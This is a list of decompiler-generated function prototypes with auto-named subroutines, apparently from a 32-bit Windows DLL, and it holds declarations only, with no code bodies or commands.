// _DWORD *__usercall sub_10013FBB@<eax>(_DWORD *a1@<esi>);
// _DWORD *__usercall sub_1001400B@<eax>(_DWORD *a1@<esi>);
// void __usercall sub_1001405B(_DWORD *a1@<ecx>, int a2@<edi>);
// void __usercall sub_1001409E(_DWORD *a1@<ecx>, int a2@<edi>);
int __thiscall sub_100140E1(_DWORD *this, int a2, char a3, unsigned __int8 pExceptionObject, LPSECURITY_ATTRIBUTES lpEventAttributes);
int *__thiscall sub_100141B0(int *Block, char a2);
LONG __thiscall sub_100141CF(int *this);
int *__stdcall sub_100141F3(int *a1, int a2);
char __cdecl sub_1001422C(int a1);
_DWORD *__cdecl sub_100142A3(_DWORD *a1, int a2);
BOOL __thiscall sub_100142F5(_DWORD *this);
BOOL __thiscall sub_10014325(int this);
// int *__usercall sub_1001436D@<eax>(int a1@<eax>, int *a2@<esi>);
bool __thiscall sub_10014389(_DWORD *this);
_DWORD *__thiscall sub_100143BA(_DWORD *Block, char a2);
// bool __usercall sub_100143D9@<al>(int a1@<esi>);
// BOOL __usercall sub_100143F3@<eax>(int a1@<eax>);
// int __usercall sub_10014406@<eax>(int a1@<esi>);
_DWORD *__thiscall sub_10014431(_DWORD *Block, char a2);
_DWORD *__cdecl sub_1001445F(_DWORD *a1);
_DWORD *__cdecl sub_10014512(_DWORD *a1);
// _DWORD *__usercall sub_10014578@<eax>(int a1@<esi>);
void __thiscall sub_100145C2(_DWORD *this);
_DWORD *__cdecl sub_10014601(_DWORD *a1);
// _DWORD *__userpurge sub_10014632@<eax>(_DWORD *a1@<esi>, int a2);
// _DWORD *__userpurge sub_10014671@<eax>(_DWORD *a1@<esi>, _DWORD *a2, int a3, int a4);
int *__thiscall sub_100146BE(int *Block, char a2);
void *__thiscall sub_100146DD(int *this);
unsigned int __stdcall sub_10014738(int a1);
// unsigned int __usercall sub_1001482C@<eax>(int a1@<eax>);
// _DWORD *__userpurge sub_10014863@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
_DWORD *__stdcall sub_100148B1(_DWORD *a1);
_DWORD *__thiscall sub_100148DC(_DWORD *Block, char a2);
void __thiscall sub_100148FB(_DWORD *this);
int __thiscall sub_10014920(void *this, int a2);
void *__thiscall sub_10014AD4(_DWORD *this);
void __thiscall sub_10014B07(_DWORD *this, char a2, int a3);
unsigned int __thiscall sub_10014B37(_DWORD *this, int a2);
_DWORD *__cdecl sub_10014B92(_DWORD *a1);
int *__cdecl sub_10014BF7(int *a1);
int sub_10014C70();
int __stdcall sub_10014CB0(int a1, void *a2, char a3);
_DWORD *__thiscall sub_10014D01(_DWORD *Block, char a2);
int __stdcall sub_10014D20(int a1, int a2);
bool __thiscall sub_10014D74(_DWORD *this);
_DWORD *__stdcall sub_10014DA7(_DWORD *a1, void *a2, char a3);
LONG __thiscall sub_10014DFB(int *this);
void __stdcall sub_10014E23(int a1, int a2, int a3);
BOOL __thiscall sub_10014E87(_DWORD *this);
void __thiscall sub_10014E92(int *this, void *a2, int a3);
int __thiscall sub_10014F1D(int *this);
bool __stdcall sub_10014F97(int a1);
// bool __usercall sub_1001500F@<al>(int a1@<eax>, int a2@<ecx>);
void __thiscall sub_10015027(_DWORD *this, void *a2, char a3, BOOL a4, DWORD a5, int a6);
_DWORD *__stdcall sub_1001509C(_DWORD *a1, int a2, int a3);
_DWORD *__thiscall sub_10015102(_DWORD *Block, char a2);
char __thiscall sub_10015121(_DWORD *this);
LONG __thiscall sub_10015165(int this, int a2);
_DWORD *__stdcall sub_10015246(_DWORD *a1);
char __stdcall sub_100152C4(int a1, _DWORD *cy);
// _DWORD *__userpurge sub_10015439@<eax>(int a1@<esi>, _DWORD *a2);
LONG __thiscall sub_1001552A(_DWORD *this);
char __thiscall sub_1001563D(_DWORD *this);
char __thiscall sub_1001566E(_DWORD *this);
// char __usercall sub_1001569F@<al>(int a1@<eax>, int a2@<edi>);
char __thiscall sub_100156D4(_DWORD *this);
// char __usercall sub_10015705@<al>(int a1@<eax>, int a2@<edi>);
_DWORD *__thiscall sub_1001573A(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10015759(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10015778(_DWORD *Block, char a2);
// char __usercall sub_10015797@<al>(int a1@<esi>);
// char __usercall sub_100157B1@<al>(int a1@<esi>);
// char __usercall sub_100157CA@<al>(int a1@<esi>);
// BOOL __usercall sub_100157E3@<eax>(int a1@<eax>);
// BOOL __usercall sub_100157F6@<eax>(int a1@<eax>);
// BOOL __usercall sub_10015809@<eax>(int a1@<eax>);
char sub_1001588D();
char sub_100158E4();
BOOL sub_1001597E();
_DWORD *__stdcall sub_100159F9(_DWORD *a1);
DWORD sub_10015B49();
int __stdcall sub_10015C80(int a1);
unsigned int __stdcall sub_10015C92(int a1);
// int __usercall sub_10015CC3@<eax>(__int32 a1@<eax>, int a2@<esi>);
// int __usercall sub_10015CDE@<eax>(_DWORD *a1@<ecx>, int a2@<esi>);
int __fastcall sub_10015D26(int a1, char a2);
void __thiscall sub_10015D5D(void **this);
void **__thiscall sub_10015D95(void **Block, char a2);
// int __userpurge sub_10015DB4@<eax>(__int32 a1@<eax>, int a2);
// int __usercall sub_10015DC9@<eax>(__int32 a1@<eax>);
int sub_10015E65();
int sub_10015E70();
int __thiscall sub_10015E7B(void *this);
BOOL sub_10015EB5();
BOOL sub_10015EC1();
bool sub_10015FF9();
// char __usercall sub_10016009@<al>(_DWORD *a1@<esi>);
// char __usercall sub_10016052@<al>(int *a1@<edx>, _DWORD *a2@<ecx>, int *a3@<edi>);
void sub_10016206();
// char __usercall sub_10016262@<al>(_DWORD *a1@<ebx>);
// LONG __usercall sub_10016377@<eax>(int a1@<esi>);
LPVOID sub_100163AB();
void __cdecl sub_100163D8(LPVOID lpTlsValue);
_DWORD *__thiscall sub_10016406(_DWORD *this, int a2);
_DWORD *__thiscall sub_10016422(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10016441(_DWORD *this);
void __thiscall sub_1001646C(_DWORD *this);
_DWORD *__stdcall sub_100164A8(_DWORD *a1, int a2);
_DWORD *__thiscall sub_100164DC(_DWORD *Block, char a2);
void __thiscall sub_100164FB(_DWORD *this);
_DWORD *__stdcall sub_1001651F(_DWORD *a1);
_DWORD *__thiscall sub_1001654D(_DWORD *Block, char a2);
void __thiscall sub_1001656C(_DWORD *this);
_DWORD *__stdcall sub_10016590(_DWORD *a1);
_DWORD *__stdcall sub_100165E5(_DWORD *a1);
void __thiscall sub_10016613(_DWORD *this);
_DWORD *__stdcall sub_10016637(_DWORD *a1, int a2);
void __thiscall sub_1001666B(_DWORD *this);
_DWORD *__stdcall sub_1001668F(_DWORD *a1);
void __thiscall sub_100166BD(_DWORD *this);
_DWORD *__stdcall sub_100166E1(_DWORD *a1);
_DWORD *__stdcall sub_10016736(_DWORD *a1);
void __thiscall sub_10016764(_DWORD *this);
_DWORD *__stdcall sub_10016788(_DWORD *a1, int a2);
_DWORD *__thiscall sub_100167BC(_DWORD *Block, char a2);
void __thiscall sub_100167DB(_DWORD *this);
_DWORD *__thiscall sub_100167F9(_DWORD *this, int a2);
int __stdcall sub_1001685F(int a1, void *a2, void *a3);
void *__thiscall sub_1001689F(void *Block, char a2);
int __stdcall sub_100168BF(int a1, int a2);
void __stdcall sub_10016902(int a1);
// void *__userpurge sub_10016952@<eax>(void *result@<eax>, int a2@<esi>, void *Src);
// int __userpurge sub_10016983@<eax>(void *a1@<ebx>, int a2, void *a3);
int *__thiscall sub_100169E9(int *Block, char a2);
// int __userpurge sub_10016A08@<eax>(int a1@<ebx>, int a2);
// int __userpurge sub_10016A83@<eax>(int a1@<ebx>, int *a2@<edi>, int a3, int a4, void *pExceptionObject);
// int __userpurge sub_10016AE9@<eax>(_DWORD *a1@<ebx>, int a2);
// int __usercall sub_10016B2F@<eax>(int *a1@<ebx>, int a2@<esi>);
LONG __thiscall sub_10016B53(int *this);
// void __usercall sub_10016B7B(int a1@<ebx>);
// int __usercall sub_10016C00@<eax>(_DWORD *a1@<eax>);
int __thiscall sub_10016C24(_DWORD *this);
// int __userpurge sub_10016C51@<eax>(int a1@<eax>, int a2);
bool __fastcall sub_10016C6D(_DWORD *a1, _DWORD *a2);
int __thiscall sub_10016CD5(_DWORD *this, int a2);
// int __usercall sub_10016DC4@<eax>(_DWORD *a1@<ebx>, int a2, _DWORD *a3);
// int __userpurge sub_10016DFF@<eax>(int a1@<ebx>, int *a2@<edi>, int a3, int a4);
// int __userpurge sub_10016E32@<eax>(int a1@<ebx>, int *a2@<edi>, int a3, int a4);
int __thiscall sub_10016E72(_DWORD *this, int a2);
// _BYTE *__userpurge sub_10016E93@<eax>(_DWORD *a1@<esi>, int a2, int Src);
__int16 __thiscall sub_10016EC6(_DWORD *this);
// _BYTE *__userpurge sub_10016EE4@<eax>(_DWORD *a1@<esi>, __int16 Src);
// _BYTE *__usercall sub_10016F14@<eax>(_DWORD *a1@<esi>);
// int *__userpurge sub_10016F42@<eax>(int *a1@<eax>, int *a2@<ecx>, void *a3);
LONG __stdcall sub_10016F6B(int *a1);
// int *__usercall sub_10016F9F@<eax>(int *a1@<eax>, int *a2@<edi>);
// LONG __userpurge sub_10016FCA@<eax>(int *a1@<esi>, void *Block);
_DWORD *__thiscall sub_10017031(_DWORD *Block, char a2);
// int __usercall sub_10017063@<eax>(int a1@<esi>);
// int __usercall sub_10017087@<eax>(int *a1@<esi>);
char __thiscall sub_1001714F(_BYTE *this);
_DWORD *__thiscall sub_1001716D(_DWORD *Block, char a2);
int __thiscall sub_1001718C(_DWORD *this);
// _DWORD *__usercall sub_100171BE@<eax>(int *a1@<eax>, _DWORD *a2@<edi>);
_DWORD *__thiscall sub_100171D3(_DWORD *Block, char a2);
int __thiscall sub_100171F2(_DWORD *this);
int __stdcall sub_10017224(int a1);
int *__thiscall sub_10017292(int *Block, char a2);
LONG __thiscall sub_100172B1(int *this);
_DWORD *__stdcall sub_100172E4(int a1);
_DWORD *__thiscall sub_10017306(int this);
_DWORD *__thiscall sub_100173AF(int this);
// int __usercall sub_10017417@<eax>(int a1@<esi>);
int __stdcall sub_10017441(int a1);
HANDLE *__thiscall sub_100174A0(HANDLE *Block, char a2);
int __stdcall sub_100174BF(int a1, int a2, int a3, char a4, struct _SECURITY_ATTRIBUTES *a5);
// LONG __userpurge sub_10017507@<eax>(int a1@<esi>, int a2, int a3, char a4, LPSECURITY_ATTRIBUTES lpMutexAttributes);
BOOL __thiscall sub_100175EC(HANDLE *this);
char __cdecl sub_10017637(int a1);
DWORD __thiscall sub_100176EB(int this);
char __thiscall sub_10017745(void *this, DWORD pExceptionObject);
// char __userpurge sub_100177C3@<al>(int a1@<esi>, DWORD pExceptionObject);
bool __thiscall sub_1001782C(_BYTE *this);
BOOL __thiscall sub_1001785F(HANDLE *this);
int __thiscall sub_1001788C(_DWORD *this);
char __thiscall sub_10017890(_BYTE *this);
int __stdcall sub_100178DB(int a1);
_DWORD *__thiscall sub_10017910(_DWORD *Block, char a2);
void __thiscall sub_1001792F(_DWORD *this);
_DWORD *__thiscall sub_1001795D(_DWORD *Block, char a2);
char __cdecl sub_1001797D(int a1, int a2, int a3, int a4);
_DWORD *__cdecl sub_10017A05(_DWORD *a1, unsigned int *a2, int a3, int a4);
char __cdecl sub_10017AE1(int a1, int a2, int a3, int a4);
_DWORD *__stdcall sub_10017D30(_DWORD *a1, int a2);
_DWORD *__stdcall sub_10017D60(_DWORD *a1);
void *__thiscall sub_10017DA4(void *Block, char a2);
int __thiscall sub_10017DC3(int this);
unsigned int __thiscall sub_10017E1B(_DWORD *this, char a2);
int __thiscall sub_10017E53(_DWORD *this, _DWORD *a2);
int __thiscall sub_10017EAF(int *this, int a2);
int __thiscall sub_10017EE5(_DWORD *this);
int __thiscall sub_10017EE9(_DWORD *this, int a2, int a3);
char *__thiscall sub_10017F34(_DWORD *this, char *a2);
LONG __thiscall sub_10017F8B(_DWORD *this);
char sub_10017FED();
int __stdcall sub_10017FF0(int a1);
_BYTE *__thiscall sub_1001801F(_BYTE *Block, char a2);
int __thiscall sub_1001803E(_BYTE *this);
int __thiscall sub_10018085(_BYTE *this);
char __thiscall sub_10018098(_BYTE *this);
int __thiscall sub_1001809C(void *this, _DWORD *a2);
_DWORD *__stdcall sub_100180D4(_DWORD *a1, int a2);
int __thiscall sub_10018133(int this);
int __thiscall sub_1001818B(int this);
int __thiscall sub_100181FC(_DWORD **this);
int __thiscall sub_10018208(_DWORD **this);
int __thiscall sub_10018210(_DWORD **this);
int __thiscall sub_1001821C(_DWORD **this);
int __thiscall sub_10018224(_DWORD **this, int a2);
_DWORD *__stdcall sub_10018255(_DWORD *a1, int a2, volatile LONG *lpAddend, int a4, int a5);
int *__thiscall sub_1001831D(int *Block, char a2);
int __stdcall sub_1001833D(int a1);
void __stdcall sub_10018372(int *a1);
_DWORD *__thiscall sub_100183BB(_DWORD *Block, char a2);
_DWORD *__fastcall sub_100183DA(int a1, int a2, _DWORD *a3);
LONG __thiscall sub_10018440(_DWORD *this, int a2, int a3);
LONG __thiscall sub_10018480(_DWORD *this, int a2, int a3);
LONG __thiscall sub_100184C0(_DWORD *this, int a2, int a3);
LONG __thiscall sub_10018500(_DWORD *this, int a2, int a3);
LONG __thiscall sub_10018540(_DWORD *this, int a2, int a3, int a4);
LONG __thiscall sub_100185A8(_DWORD *this, int a2, double a3);
LONG __thiscall sub_100185ED(_DWORD *this, int a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8);
LONG __thiscall sub_10018657(_DWORD *this, int a2, int a3, int a4, int a5, int a6, int a7);
char __thiscall sub_100186BE(_DWORD *this, int a2);
char __thiscall sub_100186FF(_DWORD *this, int a2);
__int16 __thiscall sub_10018740(_DWORD *this, int a2);
int __thiscall sub_10018783(_DWORD *this, int a2);
int __thiscall sub_100187C4(_DWORD *this, int a2, int a3, int a4);
int __thiscall sub_10018813(_DWORD *this, int a2, int a3);
int __thiscall sub_1001885F(_DWORD *this, int a2, int a3);
LONG __thiscall sub_100188AB(_DWORD *this, int a2);
int __thiscall sub_100188EE(_DWORD *this, int a2);
char __thiscall sub_1001892F(_DWORD *this, int a2);
LONG __thiscall sub_10018970(_DWORD *this, int a2);
_DWORD *__thiscall sub_100189AD(_DWORD *this, _DWORD *a2, int a3);
int __thiscall sub_10018A7D(int **this);
int __thiscall sub_10018A88(int *this);
// _DWORD *__userpurge sub_10018A96@<eax>(int a1@<ebx>, _DWORD *a2);
void *__thiscall sub_10018B2B(void *Block, char a2);
void __stdcall sub_10018B4B(int a1);
int __stdcall sub_10018B95(int a1, unsigned int a2, unsigned int a3);
int __thiscall sub_10018C09(_DWORD **this);
int __thiscall sub_10018C11(void *this, int a2);
void __stdcall sub_10018C43(_DWORD *a1, int a2, int a3);
_DWORD *__stdcall sub_10018C8B(_DWORD *a1, int a2);
void __thiscall sub_10018CE5(_DWORD *this);
_DWORD *__thiscall sub_10018CF7(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_10018D66(_DWORD *this, char a2);
int __stdcall sub_10018D93(int a1);
void __stdcall sub_10018DBC(int a1, int a2);
void __stdcall sub_10018DFE(int a1, volatile LONG *lpAddend, volatile LONG *a3);
LONG __thiscall sub_10018E6A(int *this, int a2, int a3);
LONG __thiscall sub_10018ECE(int *this, int a2, int a3);
LONG __thiscall sub_10018F28(int *this, int a2, int a3);
LONG __thiscall sub_10018F82(int *this, int a2, int a3);
LONG __thiscall sub_10018FDC(int *this, int a2, int a3, int a4);
LONG __thiscall sub_10019026(int *this, int a2, int a3, int a4);
LONG __thiscall sub_10019080(int *this, int a2, int a3, int a4, int a5, int a6, int a7);
LONG __thiscall sub_100190CA(int *this, int a2, int a3, int a4, int a5, void *a6, int a7, _DWORD **a8);
bool __thiscall sub_1001915D(void *this, int a2);
char __thiscall sub_100191A1(void *this, int a2);
__int16 __thiscall sub_100191E1(void *this, int a2);
int __thiscall sub_10019221(void *this, int a2);
int __thiscall sub_10019261(void *this, int a2, int a3);
_DWORD *__thiscall sub_10019298(void *this, _DWORD *a2, int a3);
LONG __thiscall sub_100192E2(void *this, int a2);
int __thiscall sub_10019321(int *this, int a2, int a3, volatile LONG *a4);
int __thiscall sub_100193B9(int *this, int a2);
bool __thiscall sub_100194C6(int *this, int a2);
int **__stdcall sub_10019571(int *a1, int **a2, int a3, int a4, void *Block);
_DWORD *__stdcall sub_1001966A(int *a1, _DWORD *a2, int a3, int a4, void *a5);
_DWORD *__thiscall sub_10019711(int *this, _DWORD *a2, int a3);
void __stdcall sub_100197D4(int *a1, int a2, _DWORD *a3, volatile LONG *lpAddend, int *a5);
int __thiscall sub_10019861(int *this, int a2, int a3);
int *__thiscall sub_10019927(int this, int *a2);
int __thiscall sub_10019964(int *this, int a2);
_DWORD *__thiscall sub_100199E7(int *this, _DWORD *a2, int a3);
int __thiscall sub_10019AA5(int this);
void __thiscall sub_10019AD9(int this);
int __thiscall sub_10019B60(int this);
// _DWORD *__userpurge sub_10019B8C@<eax>(_DWORD *a1@<esi>, int a2);
void __stdcall sub_10019BCB(void **a1);
// int __usercall sub_10019BF9@<eax>(_DWORD *a1@<edi>, int a2@<esi>);
void __thiscall sub_10019C27(void *this);
// _DWORD *__usercall sub_10019C52@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
_DWORD *__stdcall sub_10019C82(_DWORD *a1);
// _DWORD *__userpurge sub_10019CB7@<eax>(_DWORD *a1@<esi>, int a2);
void __stdcall sub_10019CF6(void **a1);
// int __usercall sub_10019D24@<eax>(_DWORD *a1@<edi>, int a2@<esi>);
void __thiscall sub_10019D52(void *this);
// void __usercall sub_10019D9A(void **a1@<eax>);
// void __usercall sub_10019DD8(int a1@<esi>);
// void __usercall sub_10019E12(void **a1@<eax>);
// void __usercall sub_10019E3E(int a1@<esi>);
void *__stdcall sub_10019E66(void *Block);
void *__stdcall sub_10019E81(void *Block);
LONG __stdcall sub_10019E9C(int a1);
void __stdcall sub_10019EBF(int a1);
int __stdcall sub_10019F0D(int a1, int a2, volatile LONG *lpAddend);
_DWORD *__thiscall sub_10019F97(_DWORD *Block, char a2);
// int __usercall sub_10019FC2@<eax>(int a1@<eax>);
_DWORD *__thiscall sub_10019FD0(int *this, _DWORD *a2, void *Block);
_DWORD *__thiscall sub_1001A093(int *this, _DWORD *a2, void *Block);
_DWORD *__thiscall sub_1001A156(int this, _DWORD *a2, int *Block);
int __thiscall sub_1001A299(int *this, unsigned int a2);
// int __usercall sub_1001A353@<eax>(int a1@<esi>);
int __thiscall sub_1001A3C6(int **this);
int __thiscall sub_1001A3D1(int *this);
// int __usercall sub_1001A402@<eax>(int a1@<ebx>);
_DWORD *__stdcall sub_1001A452(_DWORD *a1, int a2);
_DWORD *__thiscall sub_1001A4AC(_DWORD *this, _DWORD *a2, int a3);
// int __usercall sub_1001A533@<eax>(unsigned int a1@<ecx>, int a2@<esi>);
// void __usercall sub_1001A5C5(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
int __stdcall sub_1001A656(int a1);
_DWORD *__thiscall sub_1001A685(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001A6AB(_DWORD *Block, char a2);
void __thiscall sub_1001A6CB(_DWORD *this);
_BYTE *__thiscall sub_1001A6F1(_BYTE *this, _DWORD *a2, int pExceptionObject);
char sub_1001A757();
int __stdcall sub_1001A75A(int a1);
_DWORD *__thiscall sub_1001A789(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001A7AF(_DWORD *Block, char a2);
void __thiscall sub_1001A7CF(_DWORD *this);
_BYTE *__thiscall sub_1001A7F5(_BYTE *this, _DWORD *a2, int pExceptionObject);
char sub_1001A85B();
// int __usercall sub_1001A85E@<eax>(_DWORD *a1@<esi>);
void sub_1001A872();
// int __userpurge sub_1001A9C7@<eax>(_DWORD *a1@<ebx>, int a2@<edi>, int a3);
void *__thiscall sub_1001AA0F(void *Block, char a2);
int __thiscall sub_1001AA2E(void *this, int a2, int a3);
LONG __thiscall sub_1001AB03(int this);
void __fastcall sub_1001AB69(int a1, int a2, int a3);
void __thiscall sub_1001B18B(int this);
// int __userpurge sub_1001B2F6@<eax>(int a1@<esi>, int a2, int pExceptionObject, char a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14);
// int __userpurge sub_1001B3A0@<eax>(int a1@<eax>, int pExceptionObject);
_DWORD *__stdcall sub_1001B3D6(_DWORD *a1, int a2);
// int __userpurge sub_1001B423@<eax>(int a1@<edi>, int a2);
void __cdecl sub_1001B468(int a1, int a2, int a3, DWORD a4);
bool __cdecl sub_1001B67C(int a1, int a2);
int __stdcall sub_1001B6C9(int a1);
int __cdecl sub_1001B711(int a1, int a2, int a3);
// char __usercall sub_1001B793@<al>(int a1@<eax>, int a2@<ecx>, DWORD a3);
// bool __usercall sub_1001B7CA@<al>(char **a1@<esi>);
bool __cdecl sub_1001BA1A(WCHAR *a1, DWORD dwProcessId);
// char __usercall sub_1001BBA7@<al>(int a1@<eax>, int a2@<ecx>, DWORD a3);
// _DWORD *__usercall sub_1001BDF4@<eax>(_DWORD *a1@<esi>);
void __thiscall sub_1001BE2F(void *this);
// void __usercall sub_1001BE5A(_DWORD *a1@<ecx>, int a2@<edi>);
// _DWORD *__usercall sub_1001BEA0@<eax>(_DWORD *a1@<esi>);
void __thiscall sub_1001BEDB(void *this);
// void __usercall sub_1001BF06(_DWORD *a1@<ecx>, int a2@<edi>);
// void __usercall sub_1001BF49(int a1@<esi>);
// void __usercall sub_1001BF71(int a1@<esi>);
_DWORD *__stdcall sub_1001BF99(_DWORD *a1);
int *__thiscall sub_1001BFD4(int *Block, char a2);
void __thiscall sub_1001BFF3(int *this);
int sub_1001C027();
LONG __thiscall sub_1001C02B(int *this, int *a2);
_DWORD *__stdcall sub_1001C0D7(_DWORD *a1);
_DWORD *__thiscall sub_1001C104(_DWORD *Block, char a2);
void __thiscall sub_1001C123(_DWORD *this);
int sub_1001C147();
int __stdcall sub_1001C14B(int *a1);
_DWORD *__stdcall sub_1001C1DC(_DWORD *a1);
int *__thiscall sub_1001C217(int *Block, char a2);
void __thiscall sub_1001C236(int *this);
int sub_1001C26A();
LONG __thiscall sub_1001C26E(int *this, int *a2);
// int __userpurge sub_1001C336@<eax>(_DWORD *a1@<ebx>, int a2, int a3, volatile LONG *lpAddend, int a5, int a6, int a7, int a8, int a9, volatile LONG *a10, int a11, int a12);
void __stdcall sub_1001C3E1(_DWORD *a1);
int __stdcall sub_1001C5B0(int a1);
_BYTE *__thiscall sub_1001C60B(_BYTE *Block, char a2);
void __thiscall sub_1001C62A(_BYTE *this);
int __thiscall sub_1001C689(_BYTE *this, int a2, _DWORD *a3);
// DWORD *__userpurge sub_1001C74E@<eax>(DWORD *a1@<esi>, DWORD a2);
// int __usercall sub_1001C765@<eax>(_DWORD *a1@<esi>);
// bool __usercall sub_1001C786@<al>(_DWORD *a1@<eax>);
_DWORD *__stdcall sub_1001C7B1(_DWORD *a1);
_DWORD *__thiscall sub_1001C7DE(_DWORD *Block, char a2);
void __thiscall sub_1001C7FD(_DWORD *this);
int sub_1001C821();
int __stdcall sub_1001C825(int a1);
_DWORD *__stdcall sub_1001C862(_DWORD *a1, int a2);
_BYTE *__thiscall sub_1001C894(_BYTE *Block, char a2);
void __thiscall sub_1001C8B3(_BYTE *this);
char __fastcall sub_1001C8F5(int a1);
bool __thiscall sub_1001C909(void *this);
__int16 __thiscall sub_1001C93D(void *this);
int __thiscall sub_1001C952(void *this);
double __thiscall sub_1001C966(void *this);
int __thiscall sub_1001C97B(void *this, int a2);
_DWORD *__thiscall sub_1001C98F(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1001CA63(int *this, _DWORD *a2, char a3);
void __thiscall sub_1001CAD5(void *this, int a2, unsigned int a3);
_DWORD *__stdcall sub_1001CB1A(_DWORD *a1);
void __thiscall sub_1001CB6E(_DWORD *this);
_DWORD *__thiscall sub_1001CB80(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_1001CBEF(_DWORD *this, char a2);
int __stdcall sub_1001CC1C(int a1);
char sub_1001CC45();
_DWORD *__stdcall sub_1001CC48(_DWORD *a1, int a2, char a3);
_BYTE *__thiscall sub_1001CC7B(_BYTE *Block, char a2);
int __thiscall sub_1001CC9A(_BYTE *this);
void *__thiscall sub_1001CCDC(void *this, int a2);
_DWORD *__thiscall sub_1001CCF1(_DWORD *this, char a2);
void *__thiscall sub_1001CD0D(void *this, char a2);
void *__thiscall sub_1001CD27(void *this, char a2);
void *__thiscall sub_1001CD41(void *this, char a2, int a3);
void *__thiscall sub_1001CD5B(void *this, char a2, int a3);
void *__thiscall sub_1001CD75(void *this, int a2, int a3);
void *__thiscall sub_1001CDCD(void *this, int a2, int a3, int a4, int a5, int a6);
void __thiscall sub_1001CE0F(void *this, int a2, unsigned int a3);
char sub_1001CE3F();
// _DWORD *__userpurge sub_1001CE42@<eax>(_DWORD *a1@<ebx>, _DWORD *a2);
void *__thiscall sub_1001CE80(void *Block, char a2);
void __thiscall sub_1001CE9F(int this);
int __thiscall sub_1001CEF5(int *this, _BYTE *a2);
size_t __thiscall sub_1001CF25(_DWORD *this, _DWORD *a2);
int __thiscall sub_1001CF98(_DWORD *this);
BOOL __thiscall sub_1001CF9F(void *this);
int __thiscall sub_1001CFAA(_DWORD *this, int a2);
void __thiscall sub_1001CFDB(_DWORD *this);
int __thiscall sub_1001CFE0(_DWORD *this);
int __thiscall sub_1001CFE4(_DWORD *this, int a2, int a3);
char sub_1001D02F();
_DWORD *__stdcall sub_1001D032(_DWORD *a1);
void __stdcall sub_1001D056(void *a1);
_DWORD *__stdcall sub_1001D076(_DWORD *a1, int a2);
// int __usercall sub_1001D0A7@<eax>(_DWORD *a1@<edi>);
// _DWORD *__userpurge sub_1001D0B7@<eax>(_DWORD *a1@<edi>, _DWORD *a2, int a3);
LONG __stdcall sub_1001D0F7(int a1);
void __stdcall sub_1001D134(_DWORD *a1, int a2, int a3);
// int __usercall sub_1001D162@<eax>(_DWORD *a1@<edi>);
// _DWORD *__userpurge sub_1001D1C0@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1001D1FF(void *this);
// _DWORD *__usercall sub_1001D22A@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
// void __usercall sub_1001D24F(_DWORD *a1@<ecx>, int a2@<edi>);
// void __usercall sub_1001D2A7(int a1@<esi>);
_DWORD *__stdcall sub_1001D2D9(_DWORD *a1);
void *__thiscall sub_1001D317(void *Block, char a2);
void __thiscall sub_1001D336(int this);
int __thiscall sub_1001D387(_BYTE *this);
int __thiscall sub_1001D3A1(int this, int a2, _DWORD *a3, void *pExceptionObject, _DWORD *a5);
int __thiscall sub_1001D457(int this, int a2, void *pExceptionObject);
// int __usercall sub_1001D52B@<eax>(int a1@<eax>);
// int __userpurge sub_1001D573@<eax>(int a1@<eax>, char pExceptionObject);
char __thiscall sub_1001D5AE(_BYTE *this);
_DWORD *__stdcall sub_1001D5B2(_DWORD *a1);
_DWORD *__thiscall sub_1001D5E4(_DWORD *Block, char a2);
void __thiscall sub_1001D603(_DWORD *this);
int __thiscall sub_1001D628(_DWORD *this, int a2, int *pExceptionObject);
_DWORD *__stdcall sub_1001D77F(_DWORD *a1);
_DWORD *__stdcall sub_1001D7B1(_DWORD *a1, int a2, int a3, int a4, int a5);
_DWORD *__stdcall sub_1001D7F9(int a1, _DWORD *a2);
void __cdecl sub_1001D82E(_DWORD *a1);
void __noreturn sub_1001DA43(void); // weak
_DWORD *__stdcall sub_1001DA66(_DWORD *a1, int a2);
_DWORD *__thiscall sub_1001DAB3(_DWORD *Block, char a2);
void __thiscall sub_1001DAD7(_DWORD *this);
_BYTE *__thiscall sub_1001DB2E(_BYTE *this, int a2);
LPVOID sub_1001DB4C();
int __stdcall sub_1001DB62(int a1);
int *__thiscall sub_1001DBB9(int *Block, char a2);
void __stdcall __noreturn pfnAPC(ULONG_PTR Parameter);
void __thiscall sub_1001DC15(int this, int a2);
int __thiscall sub_1001DD96(unsigned int *this);
int __thiscall sub_1001DE5F(int *this);
LONG __thiscall sub_1001DEAB(int *this);
int __thiscall sub_1001DF17(_DWORD *this);
int sub_1001DF1B();
int __thiscall sub_1001DF1F(_DWORD *this);
int __thiscall sub_1001DF44(_DWORD *this);
int __thiscall sub_1001DF6C(int *this);
char __thiscall sub_1001DFE4(int *this);
void __thiscall sub_1001E075(int *this, int a2, int a3);
void __thiscall sub_1001E101(int *this, DWORD a2);
void __thiscall sub_1001E192(int *this, int a2);
void __thiscall sub_1001E23F(_DWORD *this);
unsigned int __stdcall StartAddress(int *lpTlsValue);
void __thiscall sub_1001E47D(_DWORD *this);
BOOL __thiscall sub_1001E4A2(void *this);
int __thiscall sub_1001E4C2(int this, int a2);
int __thiscall sub_1001E4F3(int this, int a2);
_DWORD *__thiscall sub_1001E524(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1001E575(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1001E5C8(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1001E61B(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1001E676(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1001E6D1(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_1001E746(void *this, _DWORD *a2, unsigned int pExceptionObject);
void __thiscall sub_1001E7BB(_DWORD *this);
int *__thiscall sub_1001E7E0(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_1001E848(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_1001E8B0(void *this, int a2);
void __thiscall sub_1001E8E8(void *this, int a2, int a3);
void __thiscall sub_1001E923(void *this, int a2);
